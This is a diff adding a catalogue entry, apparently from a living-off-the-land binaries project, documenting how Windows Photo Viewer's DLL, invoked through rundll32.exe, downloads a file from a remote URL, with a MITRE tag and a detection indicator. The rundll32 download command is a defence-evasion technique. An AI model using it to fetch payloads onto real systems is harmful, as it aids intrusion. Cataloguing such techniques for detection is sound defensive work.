@@ -1,0 +1,24 @@
+---
+Name: PhotoViewer.dll
+Description: Windows Photo Viewer
+Author: Avihay Eldad
+Created: 2025-06-22
+Commands:
+  - Command: rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
+    Description: Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.
+    Usecase: Download file from remote location.
+    Category: Download
+    Privileges: User
+    MitreID: T1105
+    OperatingSystem: Windows 10, Windows 11
+    Tags:
+      - Download: INetCache
+Full_Path:
+  - Path: C:\Program Files\Windows Photo Viewer\PhotoViewer.dll
+  - Path: C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll
+Detection:
+  - IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument
+Acknowledgement:
+  - Person: Avihay Eldad
+    Handle: '@avihayeldad'
+  - Person: Tommy Warren
